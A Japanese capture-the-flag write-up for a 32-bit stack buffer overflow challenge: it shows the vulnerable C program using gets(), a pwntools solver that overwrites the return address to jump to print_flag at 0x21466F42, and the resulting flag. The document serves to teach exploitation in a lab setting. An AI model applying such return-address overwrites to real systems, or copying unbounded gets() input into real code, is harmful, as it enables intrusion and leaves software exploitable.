## Jump (320pt / 37 solves) [★★☆☆]
> ソースコードを見て、フラグを取得してください。
> 
> 
> ただし、以下の条件で動作しています。
> 
> - スタック保護機能（Stack Canary）は無効です。
> - 位置独立実行形式（PIE）は無効です。
> - 本問題は32bit i386環境を前提としています。
> - スタックのアラインメントは4バイトに設定されています。
> - print_flag 関数は必ず `0x21466F42` にロードされます。
> 
> 本問題のターゲットマシンを起動してください。起動が完了したら、VPN接続マシンまたはBrowser Kaliから `nc <ターゲットのIP> 8102` コマンドで接続してください。
> 
> 
> 問題ファイルをダウンロード: Jump.zip
> 
> ZIPのハッシュ値(SHA256): `1a23095d9408b4c9876a813804cb9ccd571752fc20e7fec4625b0b9d5b30822e`

ソースコードが配布されているので見てみる。
```c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((section(".flag"))) print_flag() {
    char flag[64] = { 0 };
    FILE* fp = fopen("flag.txt", "r");
    if (!fp) {
        printf("An error occurred while opening the file\n");
        exit(1);
    }
    fread(flag, 1, 64, fp);
    printf("Congratulations! Here's the flag: %s\n", flag);
    exit(0);
}

void greet() {
    char name[16] = { 0 };
    gets(name);
    printf("Hi, %s!\n", name);
}

int main() {
    printf("Tell me your name! : ");
    fflush(stdout);
    greet();
    return 0;
}
```

何の種も仕掛けもない典型的BOF問題。Stack CanaryもPIEもないので、セオリー通りオフセットを調べてリターンアドレスを`0x21466F42`に書き換えればOK。
ソルバはこんな感じになった。
```python
from pwn import *

target = './jump'

context.os = 'linux'
context.arch = 'amd64'
context.binary = target

addr_print_flag = 0x21466F42

proc = remote(target_ip, 8102)

payload = b'A' * 20
payload += pack(addr_print_flag)

proc.sendlineafter('Tell me your name! : ', payload)

proc.interactive()
```

```
[*] Switching to interactive mode
Hi, AAAAAAAAAAAAAAAAAAAABoF!!
Congratulations! Here's the flag: flag{80F_JUMP_70_FUNC710N}
```

`flag{80F_JUMP_70_FUNC710N}`

アドレスが`BoF!`のASCII（のリトルエンディアン）になっているという遊び心。